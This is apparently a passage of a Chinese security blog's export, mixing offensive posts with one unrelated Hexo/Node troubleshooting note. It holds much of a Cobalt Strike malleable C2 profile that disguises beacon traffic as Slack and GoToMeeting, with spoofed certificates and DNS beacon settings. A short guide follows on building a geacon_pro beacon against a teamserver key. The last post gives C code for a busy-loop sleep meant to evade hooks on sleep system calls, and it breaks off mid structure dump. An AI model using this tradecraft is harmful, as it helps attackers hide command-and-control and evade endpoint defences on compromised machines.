class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Req-Id&quot;</span> <span class="string">&quot;6319165c-f976-4d0666532&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-6g1x&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64;</span><br><span class="line">prepend <span class="string">&quot;&#123;\&quot;ok\&quot;:true,\&quot;args\&quot;:&#123;\&quot;user_id\&quot;:\&quot;LUMK4GB8C\&quot;,\&quot;team_id\&quot;:\&quot;T0527B0J3\&quot;,\&quot;version_ts\&quot;:\&quot;&quot;</span>;</span><br><span class="line">append <span class="string">&quot;\&quot;&#125;,\&quot;warning\&quot;:\&quot;superfluous_charset\&quot;,\&quot;response_metadata\&quot;:&#123;\&quot;warnings\&quot;:[\&quot;superfluous_charset\&quot;]&#125;&#125;&quot;</span>;</span><br><span class="line">print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-stager <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/messages/DALBNSflEV6&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/messages/DALBNSFu8Pk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html; charset=utf-8&quot;</span>;        </span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;private, no-cache, no-store, must-revalidate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Frame-Options&quot;</span> <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-suhx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br><span class="line">https-certificate <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;slack.com&quot;</span>; #Common Name</span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;Slack Technologies Inc&quot;</span>; #Organization Name</span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;US&quot;</span>; #Country</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;San Francisco&quot;</span>; #Locality</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;DigiCert Inc&quot;</span>; #Organizational Unit Name</span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;CA&quot;</span>; #State or Province</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>; #Number of days the cert is valid <span class="keyword">for</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># dns</span></span><br><span class="line">dns-beacon <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle             <span class="string">&quot;85.61.23.113&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_max_txt          <span class="string">&quot;204&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep            <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_ttl              <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns               <span class="string">&quot;205&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend   <span class="string">&quot;cdn&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost   <span class="string">&quot;art.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> beacon               <span class="string">&quot;api2.46.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A                <span class="string">&quot;cach.dh.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA             <span class="string">&quot;book.j4.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT              <span class="string">&quot;chat.ab.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata         <span class="string">&quot;he.6o.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output           <span class="string">&quot;hd.5o.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response          <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-get <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># get请求的uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/functionalStatus/&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            </span><br><span class="line">base64url; </span><br><span class="line">parameter <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;content=&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;google-site-verification\&quot;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;link rel=\&quot;canonical\&quot; href=\&quot;https://www.gotomeeting.com/b\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;title&gt;Online Meeting Software with HD Video Conferencing | GoToMeeting&lt;/title&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;        &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;    &lt;head&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;\n&lt;meta name=\&quot;msvalidate.01\&quot; content=\&quot;63E628E67E6AD849F4185FA9AA7ABACA\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  var _kiq = _kiq || [];\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  (function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    setTimeout(function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    var d = document, f = d.getElementsByTagName(&#x27;script&#x27;)[0], s =\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;d.createElement(&#x27;script&#x27;); s.type = &#x27;text/javascript&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    s.async = true; s.src = &#x27;//s3.amazonaws.com/ki.js/66992/fWl.js&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;f.parentNode.insertBefore(s, f);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    &#125;, 1);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&#125;)();\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/body&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/html&gt;\n&quot;</span>;</span><br><span class="line">		print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/rest/2/meetings&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>; </span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64url;</span><br><span class="line">parameter <span class="string">&quot;includeMeetingsICoorganize&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            </span><br><span class="line">base64url;</span><br><span class="line">parameter <span class="string">&quot;includeCoorganizers&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;content=&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;google-site-verification\&quot;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;link rel=\&quot;canonical\&quot; href=\&quot;https://www.gotomeeting.com/b\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;title&gt;Online Meeting Software with HD Video Conferencing | GoToMeeting&lt;/title&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;        &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;    &lt;head&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;\n&lt;meta name=\&quot;msvalidate.01\&quot; content=\&quot;63E628E67E6AD849F4185FA9AA7ABACA\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  var _kiq = _kiq || [];\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  (function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    setTimeout(function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    var d = document, f = d.getElementsByTagName(&#x27;script&#x27;)[0], s =\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;d.createElement(&#x27;script&#x27;); s.type = &#x27;text/javascript&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    s.async = true; s.src = &#x27;//s3.amazonaws.com/ki.js/66992/fWl.js&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;f.parentNode.insertBefore(s, f);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    &#125;, 1);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&#125;)();\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/body&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/html&gt;\n&quot;</span>;</span><br><span class="line">	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-stager <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/Meeting/32251817/&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/Meeting/32251816/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br><span class="line">https-certificate <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;gotomeeting.com&quot;</span>; #Common Name</span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;LogMeIn Inc.&quot;</span>; #Organization Name</span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;US&quot;</span>; #Country</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;Boston&quot;</span>; #Locality</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;DigiCert Inc&quot;</span>; #Organizational Unit Name</span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;Massachusetts&quot;</span>; #State or Province</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>; #Number of days the cert is valid <span class="keyword">for</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># dns</span></span><br><span class="line">dns-beacon <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle             <span class="string">&quot;85.61.23.113&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_max_txt          <span class="string">&quot;204&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep            <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_ttl              <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns               <span class="string">&quot;205&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend   <span class="string">&quot;club&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost   <span class="string">&quot;city.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> beacon               <span class="string">&quot;crm.zk.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A                <span class="string">&quot;adm.7s.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA             <span class="string">&quot;hami.hj.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT              <span class="string">&quot;name.kh.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata         <span class="string">&quot;go.4i.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output           <span class="string">&quot;api.q3.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response          <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Code Signing Certificate</span><br><span class="line"><span class="meta"># code-signer &#123;</span></span><br><span class="line"><span class="meta">#     set keystore <span class="string">&quot;keystore.jks&quot;</span>;</span></span><br><span class="line"><span class="meta">#    set password <span class="string">&quot;password&quot;</span>;</span></span><br><span class="line"><span class="meta">#    set alias    <span class="string">&quot;server&quot;</span>;</span></span><br><span class="line"># &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo_error_at_node:internal/main/run_main_module</title>
    <url>/posts/d2fe5b0/</url>
    <content><![CDATA[<p>今天本想更新几篇文章到博客上，结果在上传生成后 界面出现问题 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(Use `node --trace-warnings ...` to show where the warning was created)</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br></pre></td></tr></table></figure>

<p>node –trace-warnings a    查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node:internal/modules/cjs/loader:959</span><br><span class="line">  throw err;</span><br><span class="line">  ^</span><br><span class="line"></span><br><span class="line">Error: Cannot find module &#x27;/Users/XXX/Blog/Hexo/a&#x27;</span><br><span class="line">    at Function.Module._resolveFilename (node:internal/modules/cjs/loader:956:15)</span><br><span class="line">    at Function.Module._load (node:internal/modules/cjs/loader:804:27)</span><br><span class="line">    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)</span><br><span class="line">    at node:internal/main/run_main_module:17:47 &#123;</span><br><span class="line">  code: &#x27;MODULE_NOT_FOUND&#x27;,</span><br><span class="line">  requireStack: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决方案 <a href="https://github.com/nodejs/help/issues/2644">https://github.com/nodejs/help/issues/2644</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.npm cache clean --force(这条命令无法用 则使用 npm cache verify)</span><br><span class="line">2.delete node_modules folder</span><br><span class="line">3.delete package-lock.json file</span><br><span class="line">4.npm install</span><br></pre></td></tr></table></figure>

<p>之后便可以顺利运行了</p>
]]></content>
  </entry>
  <entry>
    <title>geacon_pro使用</title>
    <url>/posts/c91c8eaa/</url>
    <content><![CDATA[<p>查看cs teamserver下的 key文件</p>
<p>并通过 BeaconTool.jar 进行解密 获取公钥</p>
<p><img src="/posts/c91c8eaa/1.png" alt="img"></p>
<p>在config.go 下进行配置</p>
<p><img src="/posts/c91c8eaa/2.png" alt="img"></p>
<p>第一处填入公钥</p>
<p>第二次填入cs listener 对应的ip 和端口</p>
<p>go build编译即可</p>
]]></content>
  </entry>
  <entry>
    <title>利用CPU周期执行自定义sleep</title>
    <url>/posts/e65cfe16/</url>
    <content><![CDATA[<p>sleep() sleepEx() Thread.sleep  最终都是调用的NtDelayExecution</p>
<p>避免sleep函数 或者底层系统调用上挂钩 </p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MS_PER_SECOND 1000  </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __alt_sleepms(<span class="type">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">size_t</span> x = <span class="built_in">rand</span>(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Before Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Sleeping for 10 seconds...\n&quot;</span>);</span><br><span class="line">	__alt_sleepms(<span class="number">10</span> * MS_PER_SECOND);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] After  Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="KUSER-SHARED-DATA结构"><a href="#KUSER-SHARED-DATA结构" class="headerlink" title="_KUSER_SHARED_DATA结构"></a>_KUSER_SHARED_DATA结构</h4><p>KUSER_SHARED_DATA结构定义了一个数据区域，在Windows系统中用于存储多种用户共享的数据。</p>
<p>其数据结构如下： 「向后兼容」（在高版本下 在0x330后会添加一些结构，在xp等系统下一般只会到0x330处）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _KUSER_SHARED_DATA</span><br><span class="line">ntdll!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLowDeprecated : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : Uint2B</span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : Uint2B</span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] Wchar</span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : Uint4B</span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : Uint4B</span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : Uint4B</span><br><span class="line">   +<span class="number">0x244</span> LargePageMinimum : Uint4B</span><br><span class="line">   +<span class="number">0x248</span> AitSamplingValue : Uint4B</span><br><span class="line">   +<span class="number">0x24c</span> AppCompatFlag    : Uint4B</span><br><span class="line">   +<span class="number">0x250</span> RNGSeedVersion   : Uint8B</span><br><span class="line">   +<span class="number">0x258</span> 